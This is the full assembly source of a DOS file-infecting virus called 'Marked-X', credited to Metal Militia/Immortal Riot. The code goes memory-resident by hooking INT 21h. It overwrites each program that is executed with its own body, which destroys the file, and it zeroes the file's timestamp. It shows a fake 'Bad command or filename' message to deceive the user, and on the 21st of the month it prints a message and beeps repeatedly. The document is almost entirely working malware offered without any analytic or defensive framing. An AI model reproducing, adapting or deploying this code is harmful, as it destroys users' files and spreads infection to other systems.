; Name: Marked-X 
; Author: Metal Militia/Immortal Riot 
; Resident: Yes 
; Encryption: No 
virus segment 
assume cs:virus, ds:virus 
org 100h 
start: 
mov  ah,2ah            ; Function 2Ah: Get System Date 
int  21h               ; Retrieve date 
cmp  dl,21             ; DL = Date ( tests against 21st ) 
je   Payload           ; Its time for the payload, 21st of month 
mov  ah,9h             ; Function 09h: Print String 
mov  dx,offset note    ; Location of decoy note 
int  21h               ; Explains why the file will not run. 
jmp  Go_TSR            ; Time to go TSR 
Payload: 
; The test at the beginning proves it to be the 21st, now to 
; drop a bomb on victim. 
; Prints the payload message to announce wtf is going on. 
mov  ah,9h             ; Function 09h: Print String to Standard output 
mov  dx,offset society ; Its the message 
int  21h               ; Tells DOS to announce our presence 
mov  cx,1000           ; Print 1000 times 
mov  ax,0E07h          ; Function 0Eh: Teletype output 
                         ; 07h = The bell character, makes a beep! 
beeper: 
int  10h               ; Video functions 
loop beeper            ; Beeps 1000h times, The count in CX 
Go_TSR: 
jmp  tsrdata ; Celebrate! now put us as a TSR in memory 
new21: 
pushf                    ; Pushes the Flags Register 
cmp  ah,4bh              ; Function 4Bh: Execute program 
jz   infect              ; If a file is being run, infect it. 
jmp  short end21         ; If a file is not being run then we 
                         ; must head back to the old INT 21h. 
infect: 
mov  ax,4301h            ; Function 4301h: Set Attributes 
and  cl,0feh             ; Keeps all File attributes 'cept read-only 
int  21h                 ; Makes the file writeable 
mov  ax,3d02h            ; Function 3D02h: Open File for Read/Write access 
int  21h 
mov  bx,ax        ; Puts file handle in BX 
push ax                     ; Push all 
push bx 
push cx 
push dx 
push ds 
push cs 
pop  ds 
mov  ax,4200h               ; Move to beginning of victim file 
xor  cx,cx 
cwd 
int  21h 
mov  cx,offset endvir-100h  ; Length of area to write 
mov  ah,40h                 ; Function 40h: Write to file 
mov  dx,100h                ; Start of Virus 
int  21h 
cwd                         ; Set Date/Time 
xor  cx,cx                  ; to zero (00-00-00) 
mov  ax,5701h 
int  21h 
mov  ah,3eh                 ; Close Victim file 
int  21h 
x21: 
pop  ds ; pop all        ; Restores all registers 
pop  dx 
pop  cx 
pop  bx 
pop  ax 
end21: 
popf           ; Pops the flags register to keep it unaltered 
db   0eah      ; Jumps Far to the old Int 21h handler 
old21     dw     0,0 ; Where to store the old INT21 
data_1    db     'Marked-X' ; Virus name 
          db     'Will we ever learn to talk with eachother?' ; Virus poem 
          db     '(c) Metal Militia/Immortal Riot' ; Virus author 
society   db     'In any country, prison is where society sends it''s',0dh,0ah 
          db     'failures, but in this country society itself is faily',0dh,0ah 
          db     '$' ; Information note 
note      db     'Bad command or filename',0dh,0ah 
          db     '$' ; Fake note 
tsrdata: 
mov  ax,3521h       ; Function 35??h: Get Interrupt Vector 
                    ; AL = INT# 
               ; Returns ES:BX of old Interrupt vector 
int  21h                         ; Find out where INT 21h goes 
mov  cs:[old21],bx       ; Places the Old INT 21h vector into 
mov  cs:[old21+2],es     ; its proper place. 
mov  dx,offset new21          ; Insertion Point of New INT 21h 
mov  ax,2521h            ; Function 25??h: Set new Int Vector 
                         ; AL = INT # 
               ; Makes DS:DX new INT Vector 
int  21h                 ; Coolness 
push cs                  ; CS = Code segment that the PSP of TSR 
                         ; progge is located in. 
pop  ds                  ; Copy that into DS 
mov  dx,offset endvir            ; Put all of us in memory 
int  27h                         ; Do it, TSR (terminate & stay resident) 
endvir    label  byte ; End of file 
virus     ends 
          end    start 